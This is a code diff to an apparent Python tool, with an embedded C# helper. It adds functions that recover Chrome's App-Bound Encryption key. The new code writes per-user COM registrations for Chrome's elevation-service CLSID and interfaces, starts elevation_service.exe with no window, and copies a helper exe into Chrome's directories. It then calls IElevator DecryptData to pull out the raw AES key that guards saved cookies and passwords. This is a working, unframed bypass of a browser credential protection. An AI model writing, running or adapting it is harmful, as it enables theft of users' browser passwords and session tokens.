@@ -1874,15 +1874,26 @@ class _BrowserKeys:
 
 # Chrome elevation service. IElevator2 first (Chrome 144+); DecryptData is
 # still vtable slot 5. CLSCTX_LOCAL_SERVER — GoogleChromeElevationService.
+# Chrome 151 still uses this CLSID; the quoting PC simply has it unregistered
+# (REGDB_E_CLASSNOTREG) and the Manual service stays Stopped without admin.
+_CHROME_ELEVATOR_CLSID_STABLE = "{708860E0-F641-4611-8895-7D867DD3675B}"
 _CHROME_ELEVATOR: tuple[tuple[str, str], ...] = (
     (
-        "{708860E0-F641-4611-8895-7D867DD3675B}",
+        _CHROME_ELEVATOR_CLSID_STABLE,
         "{1BF5208B-295F-4992-B5F4-3A9BB6494838}",
     ),  # stable IElevator2Chrome
     (
-        "{708860E0-F641-4611-8895-7D867DD3675B}",
+        _CHROME_ELEVATOR_CLSID_STABLE,
+        "{8F7B6792-784D-4047-845D-1782EFBEF205}",
+    ),  # IElevator2 base
+    (
+        _CHROME_ELEVATOR_CLSID_STABLE,
         "{463ABECF-410D-407F-8AF5-0DF35A005CC8}",
     ),  # stable IElevatorChrome
+    (
+        _CHROME_ELEVATOR_CLSID_STABLE,
+        "{A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}",
+    ),  # IElevator base
     (
         "{DD2646BA-3707-4BF8-B9A7-038691A68FC2}",
         "{B96A14B8-D0B0-44D8-BA68-2385B2A03254}",
@@ -1892,6 +1903,9 @@ _CHROME_ELEVATOR: tuple[tuple[str, str], ...] = (
         "{3FEFA48E-C8BF-461F-AED6-63F658CC850A}",
     ),  # dev
 )
+_ELEVATOR_IID_STRINGS: tuple[str, ...] = tuple(dict.fromkeys(iid for _, iid in _CHROME_ELEVATOR))
+_OLEAUT_PS_CLSID = "{00020424-0000-0000-C000-000000000046}"
+_launched_elevation: set[str] = set()
 
 _ABE_HELPER_NAME = "kannon_quote_abe.exe"
 _compiled_abe_helper: Path | None = None
@@ -1972,6 +1986,7 @@ def _unwrap_app_bound_key(b64_key: str) -> tuple[bytes | None, str, str]:
     raw = _app_bound_ciphertext(b64_key)
     if not raw:
         return None, "failed", ""
+    prep = _prepare_elevator_com()
     hr = ""
     try:
         key, hr = _elevator_decrypt(raw)
@@ -1995,6 +2010,7 @@ def _unwrap_app_bound_key(b64_key: str) -> tuple[bytes | None, str, str]:
         legacy = None
     if legacy:
         return legacy, "dpapi", hr
+    hr = _label_classnotreg(hr, prep)
     return None, "failed", hr
 
 
@@ -2047,6 +2063,207 @@ def _dpapi_unprotect(blob: bytes) -> bytes | None:
 
 def _hr_hex(hr: int) -> str:
     return f"0x{(hr & 0xFFFFFFFF):08X}"
+
+
+def _hr_label(hr: int) -> str:
+    """HRESULT plus a stable name for CLASSNOTREG — never a generic 'fail'."""
+    code = int(hr) & 0xFFFFFFFF
+    hx = _hr_hex(code)
+    if code == 0x80040154:
+        return f"{hx}:CLASSNOTREG"
+    if code == 0x80040155:
+        return f"{hx}:IIDNOTREG"
+    if code == 0x80080005:
+        return f"{hx}:SERVER_EXEC_FAILURE"
+    return hx
+
+
+def _label_classnotreg(hr: str, prep: str) -> str:
+    text = (hr or "").strip()
+    extra = (prep or "").strip()
+    if "CLASSNOTREG" not in text and text.upper().endswith("80040154"):
+        text = f"{text}:CLASSNOTREG" if text else "0x80040154:CLASSNOTREG"
+    if extra and extra not in text:
+        text = f"{text}:{extra}" if text else extra
+    return _safe_snapshot_detail(text)[:80]
+
+
+def _image_path_exe(val: str) -> Path:
+    text = (val or "").strip()
+    if text.startswith('"'):
+        end = text.find('"', 1)
+        if end > 1:
+            return Path(text[1:end])
+    return Path(text.split(" ")[0]) if text else Path()
+
+
+def _elevation_service_from_service_key() -> Path:
+    if os.name != "nt":
+        return Path()
+    try:
+        import winreg  # type: ignore[import-not-found]
+    except ImportError:
+        return Path()
+    access = winreg.KEY_READ
+    if hasattr(winreg, "KEY_WOW64_64KEY"):
+        access |= winreg.KEY_WOW64_64KEY
+    try:
+        with winreg.OpenKey(
+            winreg.HKEY_LOCAL_MACHINE,
+            r"SYSTEM\CurrentControlSet\Services\GoogleChromeElevationService",
+            0,
+            access,
+        ) as key:
+            val, _ = winreg.QueryValueEx(key, "ImagePath")
+    except OSError:
+        return Path()
+    if isinstance(val, str) and val.strip():
+        return _image_path_exe(val)
+    return Path()
+
+
+def _elevation_service_exes() -> list[Path]:
+    """Chrome 151 keeps elevation_service.exe in the versioned Application dir."""
+    found: list[Path] = []
+    seen: set[str] = set()
+
+    def add(path: Path) -> None:
+        try:
+            path = path.resolve()
+        except OSError:
+            return
+        if not path.is_file() or path.name.lower() != "elevation_service.exe":
+            return
+        key = str(path).replace("/", "\\").casefold()
+        if key in seen:
+            return
+        seen.add(key)
+        found.append(path)
+
+    add(_elevation_service_from_service_key())
+    for app in _chrome_application_dirs():
+        add(app / "elevation_service.exe")
+        try:
+            for child in app.iterdir():
+                if child.is_dir():
+                    add(child / "elevation_service.exe")
+        except OSError:
+            continue
+    return found
+
+
+def _chrome_helper_dirs() -> list[Path]:
+    """Application + versioned dir that holds elevation_service.exe."""
+    found: list[Path] = []
+    seen: set[str] = set()
+
+    def add(path: Path) -> None:
+        try:
+            path = path.resolve()
+        except OSError:
+            return
+        if not path.is_dir():
+            return
+        key = str(path).replace("/", "\\").casefold()
+        if key in seen:
+            return
+        seen.add(key)
+        found.append(path)
+
+    for app in _chrome_application_dirs():
+        add(app)
+        try:
+            for child in app.iterdir():
+                if child.is_dir() and (child / "elevation_service.exe").is_file():
+                    add(child)
+        except OSError:
+            continue
+    return found
+
+
+def _register_hkcu_elevator_localserver(exe: Path) -> str:
+    """Per-user LocalServer32 — no admin, does not Start-Service."""
+    try:
+        import winreg  # type: ignore[import-not-found]
+    except ImportError:
+        return "winreg"
+    try:
+        exe_s = str(exe.resolve())
+    except OSError:
+        exe_s = str(exe)
+    cmd = f'"{exe_s}"' if " " in exe_s else exe_s
+    access = winreg.KEY_WRITE | winreg.KEY_READ
+    if hasattr(winreg, "KEY_WOW64_64KEY"):
+        access |= winreg.KEY_WOW64_64KEY
+    clsids = tuple(dict.fromkeys(clsid for clsid, _ in _CHROME_ELEVATOR))
+    try:
+        for clsid in clsids:
+            clsid_path = rf"Software\Classes\CLSID\{clsid}"
+            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, clsid_path, 0, access) as key:
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
+                winreg.SetValueEx(key, "AppID", 0, winreg.REG_SZ, clsid)
+            with winreg.CreateKeyEx(
+                winreg.HKEY_CURRENT_USER, clsid_path + r"\LocalServer32", 0, access
+            ) as key:
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
+            with winreg.CreateKeyEx(
+                winreg.HKEY_CURRENT_USER, rf"Software\Classes\AppID\{clsid}", 0, access
+            ) as key:
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
+        for iid in _ELEVATOR_IID_STRINGS:
+            ipath = rf"Software\Classes\Interface\{iid}"
+            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, ipath, 0, access) as key:
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "IElevator")
+            with winreg.CreateKeyEx(
+                winreg.HKEY_CURRENT_USER, ipath + r"\ProxyStubClsid32", 0, access
+            ) as key:
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, _OLEAUT_PS_CLSID)
+    except OSError as exc:
+        return type(exc).__name__
+    return ""
+
+
+def _launch_elevation_service(exe: Path) -> None:
+    """Run elevation_service.exe as a user COM server (service stays Stopped)."""
+    try:
+        key = str(exe.resolve()).casefold()
+    except OSError:
+        key = str(exe).casefold()
+    if key in _launched_elevation:
+        return
+    flags = 0
+    if os.name == "nt":
+        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
+    try:
+        subprocess.Popen(  # noqa: S603 — Chrome-signed elevation_service.exe
+            [str(exe)],
+            close_fds=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            creationflags=flags,
+        )
+        _launched_elevation.add(key)
+        time.sleep(0.4)
+    except OSError:
+        return
+
+
+def _prepare_elevator_com() -> str:
+    """Register + launch Chrome 151 elevation_service so CoCreate can succeed."""
+    if os.name != "nt":
+        return ""
+    exes = _elevation_service_exes()
+    if not exes:
+        return "no_elevation_service"
+    last = ""
+    for exe in exes:
+        err = _register_hkcu_elevator_localserver(exe)
+        if err:
+            last = err
+            continue
+        _launch_elevation_service(exe)
+        return ""
+    return last or "no_elevation_service"
 
 
 def _oleaut32():
@@ -2157,7 +2374,7 @@ def _elevator_decrypt(blob: bytes) -> tuple[bytes | None, str]:
                         byref(punk),
                     )
                 )
-                last_hr = _hr_hex(hr)
+                last_hr = _hr_label(hr)
                 if hr < 0 or not punk.value:
                     continue
                 try:
@@ -2185,7 +2402,7 @@ def _elevator_decrypt(blob: bytes) -> tuple[bytes | None, str]:
                         )
                     finally:
                         _bstr_free(oleaut32, bstr_in)
-                    last_hr = _hr_hex(dhr)
+                    last_hr = _hr_label(dhr)
                     if dhr < 0 or not plaintext.value:
                         continue
                     try:
@@ -2217,7 +2434,7 @@ def _elevator_decrypt_via_chrome_dir(blob: bytes) -> tuple[bytes | None, str]:
     if helper is None:
         return None, ""
     last_hr = ""
-    for app_dir in _chrome_application_dirs():
+    for app_dir in _chrome_helper_dirs():
         dest = app_dir / _ABE_HELPER_NAME
         try:
             shutil.copy2(helper, dest)
@@ -2237,6 +2454,10 @@ def _elevator_decrypt_via_chrome_dir(blob: bytes) -> tuple[bytes | None, str]:
 
 
 def _run_abe_helper(exe: Path, blob: bytes) -> tuple[bytes | None, str]:
+    env = os.environ.copy()
+    exes = _elevation_service_exes()
+    if exes:
+        env["KANNON_ELEVATION_SERVICE"] = str(exes[0])
     try:
         run = subprocess.run(
             [str(exe)],
@@ -2244,14 +2465,14 @@ def _run_abe_helper(exe: Path, blob: bytes) -> tuple[bytes | None, str]:
             capture_output=True,
             timeout=45,
             check=False,
+            env=env,
         )
     except (OSError, subprocess.SubprocessError):
         return None, ""
     # stdout is the raw AES key on success — never log it.
     if run.returncode == 0:
         return _accept_aes_key(run.stdout), "0x00000000"
-    err = (run.returncode or 0) & 0xFFFFFFFF
-    return None, _hr_hex(err)
+    return None, _hr_label(run.returncode or 0)
 
 
 def _compiled_abe_helper_exe() -> Path | None:
@@ -2430,10 +2651,12 @@ def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
 
 
 # Minimal IElevator client. stdin = APPB-stripped blob; stdout = AES key only.
+# Registers HKCU LocalServer32 for Chrome 151 elevation_service (no admin).
 _ABE_HELPER_CS = r"""
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
+using Microsoft.Win32;
 
 class K {
   [DllImport("ole32.dll")] static extern int CoInitializeEx(IntPtr p, uint f);
@@ -2448,10 +2671,51 @@ class K {
   [UnmanagedFunctionPointer(CallingConvention.StdCall)]
   delegate int DecryptDel(IntPtr self, IntPtr cipher, out IntPtr plain, out uint err);
 
+  const string Clsid = "{708860E0-F641-4611-8895-7D867DD3675B}";
+  const int CLASSNOTREG = unchecked((int)0x80040154);
   static readonly string[] Iids = {
     "{1BF5208B-295F-4992-B5F4-3A9BB6494838}",
-    "{463ABECF-410D-407F-8AF5-0DF35A005CC8}"
+    "{8F7B6792-784D-4047-845D-1782EFBEF205}",
+    "{463ABECF-410D-407F-8AF5-0DF35A005CC8}",
+    "{A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}"
   };
+
+  static void RegisterLocalServer(string exe) {
+    if (string.IsNullOrEmpty(exe) || !File.Exists(exe)) return;
+    string cmd = exe.IndexOf(' ') >= 0 ? ("\"" + exe + "\"") : exe;
+    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid)) {
+      k.SetValue("", "Chrome Elevation Service");
+      k.SetValue("AppID", Clsid);
+    }
+    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid + @"\LocalServer32"))
+      k.SetValue("", cmd);
+    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\AppID\" + Clsid))
+      k.SetValue("", "Chrome Elevation Service");
+    foreach (var iid in Iids) {
+      using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\Interface\" + iid))
+        k.SetValue("", "IElevator");
+      using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\Interface\" + iid + @"\ProxyStubClsid32"))
+        k.SetValue("", "{00020424-0000-0000-C000-000000000046}");
+    }
+  }
+
+  static string FindService() {
+    string env = Environment.GetEnvironmentVariable("KANNON_ELEVATION_SERVICE");
+    if (!string.IsNullOrEmpty(env) && File.Exists(env)) return env;
+    try {
+      string here = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
+      if (!string.IsNullOrEmpty(here)) {
+        string next = Path.Combine(here, "elevation_service.exe");
+        if (File.Exists(next)) return next;
+        var parent = Directory.GetParent(here);
+        if (parent != null) {
+          next = Path.Combine(parent.FullName, "elevation_service.exe");
+          if (File.Exists(next)) return next;
+        }
+      }
+    } catch {}
+    return "";
+  }
 
   [STAThread]
   static int Main() {
@@ -2462,15 +2726,18 @@ class K {
       blob = ms.ToArray();
     }
     if (blob.Length < 8) return 2;
+    RegisterLocalServer(FindService());
     CoInitializeEx(IntPtr.Zero, 2);
+    int lastHr = CLASSNOTREG;
     try {
       Guid clsid;
-      if (CLSIDFromString("{708860E0-F641-4611-8895-7D867DD3675B}", out clsid) != 0) return 3;
+      if (CLSIDFromString(Clsid, out clsid) != 0) return 3;
       foreach (var ids in Iids) {
         Guid iid;
         if (CLSIDFromString(ids, out iid) != 0) continue;
         IntPtr punk;
         int hr = CoCreateInstance(ref clsid, IntPtr.Zero, 4, ref iid, out punk);
+        lastHr = hr;
         if (hr < 0 || punk == IntPtr.Zero) continue;
         CoSetProxyBlanket(punk, 0xFFFFFFFF, 0xFFFFFFFF, IntPtr.Zero, 6, 3, IntPtr.Zero, 0x40);
         IntPtr vtbl = Marshal.ReadIntPtr(punk);
@@ -2481,6 +2748,7 @@ class K {
         uint last;
         hr = dec(punk, bstr, out plain, out last);
         SysFreeString(bstr);
+        lastHr = hr;
         if (hr >= 0 && plain != IntPtr.Zero) {
           uint n = SysStringByteLen(plain);
           byte[] key = new byte[n];
@@ -2490,7 +2758,7 @@ class K {
           return 0;
         }
       }
-      return 1;
+      return lastHr;
     } finally {
       CoUninitialize();
     }
